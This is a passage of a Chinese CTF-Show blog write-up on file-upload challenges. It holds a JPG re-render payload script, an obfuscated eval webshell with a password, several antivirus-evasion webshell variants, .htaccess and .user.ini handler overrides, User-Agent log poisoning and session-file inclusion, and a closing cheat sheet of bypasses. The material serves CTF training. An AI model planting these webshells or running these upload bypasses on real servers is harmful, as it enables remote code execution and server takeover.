unlink(&#x27;payload_&#x27;.$argv[1]);    die(&#x27;Something\&#x27;s wrong&#x27;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#x27;&#x27;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;	//使用方法 php exp.php 1.jpg<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/21/ScR1qu6KTMr2sVQ.png" alt="image-20210721162813731"></p>
+<h2 id="1-13-Web-166-—-zip-文件上传"><a href="#1-13-Web-166-—-zip-文件上传" class="headerlink" title="1.13 Web 166 — zip 文件上传"></a>1.13 Web 166 — zip 文件上传</h2><p><img src="https://i.loli.net/2021/07/21/9TkxK1odzty2Nv3.png" alt="image-20210721164403808"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Content-Type: application/x-zip-compressed</span></span><br></pre></td></tr></table></figure>
+
+<p>将一句话木马后缀更改为 <code>zip</code> 上传即可，查看文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/download.php?file=9643f09dfc5004a1dc73f4c025f084d2.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/21/byWHDYP5SwFzrva.png" alt="image-20210721165703094"></p>
+<p>将代码更改即可</p>
+<h2 id="1-14-Web-167-—-htaccess"><a href="#1-14-Web-167-—-htaccess" class="headerlink" title="1.14 Web 167 —  .htaccess"></a>1.14 Web 167 —  .htaccess</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd</span><br></pre></td></tr></table></figure>
+
+<p>尝试 jpg 文件成功上传之后发现服务器是 <code>Apache </code>，再根据提示，尝试上传 <code>.htaccess</code></p>
+<p><img src="https://i.loli.net/2021/07/21/DSlwZg8LF4zHdat.png" alt="image-20210721170008372"></p>
+<p><img src="https://i.loli.net/2021/07/21/BcLmbKfsRQgp2j7.png" alt="image-20210721170131053"></p>
+<p>成功上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 111.png&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后访问 <code>/upload/111.png</code> </p>
+<p>蚁剑连接即可</p>
+<h2 id="1-15-Web-168-—-免杀代码"><a href="#1-15-Web-168-—-免杀代码" class="headerlink" title="1.15 Web 168 — 免杀代码"></a>1.15 Web 168 — 免杀代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基础免杀<span class="comment"># 过滤了 eval , system , $_POST , $_GET 等</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/21/JC5EVDoc8fWKMmG.png" alt="image-20210721170727602"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可使用反引号&lt;?=`ls /var/www/html`?&gt;		#flag.php flagaa.php images index.php js layui upload upload.php &lt;?=`cat /var/www/html/flagaa.php`?&gt;	</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其它绕过方式</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php // 使用时请删除此行, 连接密码: TyKPuntU ?&gt;&lt;?php <span class="variable">$bFIY</span>=create_function(chr(25380/705).chr(92115/801).base64_decode(<span class="string">&#x27;bw==&#x27;</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(<span class="string">&#x27;YQ==&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).chr(060340/01154).chr(01041-0775).base64_decode(<span class="string">&#x27;cw==&#x27;</span>).str_rot13(<span class="string">&#x27;b&#x27;</span>).chr(01504-01327).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>).chr(057176/01116).chr(0xe3b4/0x3dc));<span class="variable">$bFIY</span>(base64_decode(<span class="string">&#x27;NjgxO&#x27;</span>.<span class="string">&#x27;Tc7QG&#x27;</span>.<span class="string">&#x27;V2QWw&#x27;</span>.<span class="string">&#x27;oJF9Q&#x27;</span>.<span class="string">&#x27;&#x27;</span>.str_rot13(<span class="string">&#x27;G&#x27;</span>).str_rot13(<span class="string">&#x27;1&#x27;</span>).str_rot13(<span class="string">&#x27;A&#x27;</span>).base64_decode(<span class="string">&#x27;VQ==&#x27;</span>).str_rot13(<span class="string">&#x27;J&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(0x304-0x2d3).base64_decode(<span class="string">&#x27;Ug==&#x27;</span>).chr(13197/249).str_rot13(<span class="string">&#x27;F&#x27;</span>).base64_decode(<span class="string">&#x27;MQ==&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;B1bnR&#x27;</span>.<span class="string">&#x27;VXSk7&#x27;</span>.<span class="string">&#x27;MjA0N&#x27;</span>.<span class="string">&#x27;TkxOw&#x27;</span>.<span class="string">&#x27;==&#x27;</span>.<span class="string">&#x27;&#x27;</span>));?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;<span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);<span class="variable">$c</span> = <span class="variable">$b</span>[0].<span class="variable">$b</span>[1].<span class="variable">$b</span>[2].<span class="variable">$b</span>[3].<span class="variable">$b</span>[4].<span class="variable">$b</span>[5];<span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,1).<span class="string">&#x27;ystem&#x27;</span>;<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];<span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];<span class="variable">$a</span>(<span class="variable">$b</span>);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`<span class="variable">$_REQUEST</span>[1]`;?&gt;<span class="comment"># 利用反引号执行系统命令</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);<span class="comment"># 拼接</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="variable">$pi</span>&#123;abs&#125;)($<span class="variable">$pi</span>&#123;acos&#125;);<span class="comment"># get传参   abs=system&amp;acos=ls# 数学函数</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-16-Web-169-170-—-日志包含（未过滤-log）"><a href="#1-16-Web-169-170-—-日志包含（未过滤-log）" class="headerlink" title="1.16 Web 169-170 — 日志包含（未过滤 log）"></a>1.16 Web 169-170 — 日志包含（未过滤 log）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">高级免杀</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前端做了 .zip 检查# 后端做了 Content-Type 检查</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/23/aQOvN7gYmnkrzJI.png" alt="image-20210723121849471"></p>
+<p><img src="https://i.loli.net/2021/07/23/Tl6QwvReabhIYEK.png" alt="image-20210723122033455"></p>
+<p>访问 <code>1.php</code> ，我们必须自己上传一个 <code>.php</code> 文件</p>
+<p><img src="https://i.loli.net/2021/07/23/FpgVTBIsjbMiE7P.png" alt="image-20210723122136445"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;ls ../&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/23/m7yc4khwYu9qO6t.png" alt="image-20210723122412864"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;cat ../flagaa.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><ol>
+<li><p>找到允许上传的文件类型，抓包</p>
+</li>
+<li><p>在 Content-Type 正确的情况下，首先尝试直接更改 后缀为 .php ，写入一句话木马</p>
+</li>
+<li><p>上述不允许的情况下，观察服务器类型，nginx 尝试 .user.ini ，Apache 尝试 .htaccess</p>
+<ul>
+<li>```bash<h1 id="user-iniauto-prepend-file-1-pngauto-prepend-file-testauto-prepend-file-var-log-nginx-access-log"><a href="#user-iniauto-prepend-file-1-pngauto-prepend-file-testauto-prepend-file-var-log-nginx-access-log" class="headerlink" title=".user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log"></a>.user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ ```bash</span><br><span class="line">  # .htaccessAddType application/x-httpd-php .png	# 特定文件后缀当作 php 文件处理AddHandler php5-script php 		# 包含关键字的文件名当作 php 文件处理&lt;FilesMatch &quot;文件名&quot;&gt;			# 特定文件名当作 php 文件处理SetHandler application/x-httpd-php&lt;/FilesMatch&gt;SetHandler application/x-httpd-php		#所有文件后缀都当作 php 文件处理</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>.user.ini 注意该目录下是否已经含有 .php 文件</p>
+</li>
+<li><p>过滤 php </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写绕过# 短标签</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤 []</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#125; 绕过</span></span><br></pre></td></tr></table></figure></li>
+<li><p>过滤 分号 ;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令执行&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>日志包含 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤 <span class="built_in">log</span>  Web 160<span class="comment"># 上传 .user.iniauto_prepend_file=123.png# 上传 123.png，在其中进行拼接# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;# 访问 /upload/index.php 抓包在 User-Agent 中添加恶意代码 &lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; ，访问</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未过滤 <span class="built_in">log</span>  Web 169 170<span class="comment"># 上传 .user.iniauto_prepend_file=/var/log/nginx/access.log# 上传 .php 文件，同时 User-Agent 写入 代码 &lt;?php phpinfo(); ?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;内容随意# 访问，命令执行</span></span><br></pre></td></tr></table></figure></li>
+<li><p>.user.ini 上传不了？尝试文件头写入 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure></li>
+<li><p>过滤 <code>.</code>  Web 162-163</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 即不能包含日志文件，则包含 session 文件# 上传 .user.iniGIF89aauto_prepend_file=test# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;# 构造 POST 数据包&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 任意上传文件，抓包修改，PHPSESSID=test，写入代码添入变量 Numbers 爆破# 访问 /upload/index.php 添入变量 Numbers 同时爆破</span></span><br></pre></td></tr></table></figure></li>
+<li><p>二次渲染  Web 164 165</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">png 图片<span class="comment"># 脚本生成图片上传，访问，命令执行 &lt;?=$_GET[0]($_POST[1]);?&gt;# 下载至本地查看（文件包含）</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg 图片<span class="comment"># 直接上传 jpg 图片，下载回来，使用脚本处理，得到新的 jpg 图片，再次上传# 下载至本地查看（文件包含）</span></span><br></pre></td></tr></table></figure></li>
+<li><p>后缀类型不可猜测时，.zip 文件上传 Web 166</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .zip 文件抓包 Content-Type: application/x-zip-compressed# 内容直接是恶意代码# 找到 .zip 文件路径，进行查看# 命令执行</span></span><br></pre></td></tr></table></figure></li>
+<li><p>免杀 Web 168</p>
+</li>
+<li><p>前端做后缀检测，后端做不同后缀的 Content-Type 检测</p>
+<p>注意抓包后修改 Content-Type 为白名单</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div id="donation_div"></div>
+
+
+<script src="/js/vdonate.js"></script>
+
+<script>
+var a = new Donate({
+  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+  btnText: 'Donate', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
+  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
+});
+</script>
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>xizhi-future</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2021/10/01/CTF-Show-文件上传/" target="_blank" title="CTF-Show-文件上传">https://xizhi-future.github.io/2021/10/01/CTF-Show-文件上传/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CTF-Show-Misc入门
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF-Show-PHP特性</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-Show-%E2%80%94-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.</span> <span class="nav-text">CTF Show — 文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-Web-151-%E2%80%94-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 Web 151 — 前端验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-Web-152"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 Web 152</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-Web-153-%E2%80%94-user-ini"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 Web 153 — .user.ini</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-Web-154-%E2%80%94-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87-php"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 Web 154 — 大小写绕过 php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-Web-155-%E2%80%94-%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87-php"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 Web 155 — 短标签绕过 php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-Web-156-%E2%80%94-%E4%BB%A3%E6%9B%BF"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 Web 156 — { } 代替 [ ]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-Web-157-159-%E2%80%94-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.7.</span> <span class="nav-text">1.7 Web 157-159 — 命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-8-Web-160-%E2%80%94-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%EF%BC%88%E8%BF%87%E6%BB%A4-log%EF%BC%89"><span class="nav-number">1.8.</span> <span class="nav-text">1.8 Web 160 — 日志包含（过滤 log）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-9-Web-161-%E2%80%94-%E6%96%87%E4%BB%B6%E5%A4%B4-GIF89a-%E5%86%99%E5%85%A5"><span class="nav-number">1.9.</span> <span class="nav-text">1.9 Web 161 — 文件头 GIF89a 写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-10-Web-162-163-%E2%80%94-session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.10.</span> <span class="nav-text">1.10 Web 162-163 — session 文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-11-Web-164-%E2%80%94-png-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">1.11.</span> <span class="nav-text">1.11 Web 164 — png 二次渲染</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-12-Web-165-%E2%80%94-jpg-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">1.12.</span> <span class="nav-text">1.12 Web 165 — jpg 二次渲染</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-13-Web-166-%E2%80%94-zip-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.13.</span> <span class="nav-text">1.13 Web 166 — zip 文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-14-Web-167-%E2%80%94-htaccess"><span class="nav-number">1.14.</span> <span class="nav-text">1.14 Web 167 —  .htaccess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-15-Web-168-%E2%80%94-%E5%85%8D%E6%9D%80%E4%BB%A3%E7%A0%81"><span class="nav-number">1.15.</span> <span class="nav-text">1.15 Web 168 — 免杀代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-16-Web-169-170-%E2%80%94-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%EF%BC%88%E6%9C%AA%E8%BF%87%E6%BB%A4-log%EF%BC%89"><span class="nav-number">1.16.</span> <span class="nav-text">1.16 Web 169-170 — 日志包含（未过滤 log）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">二、总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#user-iniauto-prepend-file-1-pngauto-prepend-file-testauto-prepend-file-var-log-nginx-access-log"><span class="nav-number">3.</span> <span class="nav-text">.user.iniauto_prepend_file&#x3D;1.pngauto_prepend_file&#x3D;testauto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/essayists" class="mobile-nav-link">Essayists</a>
+  
+    <a href="/friendly-links" class="mobile-nav-link">Friendly-links</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
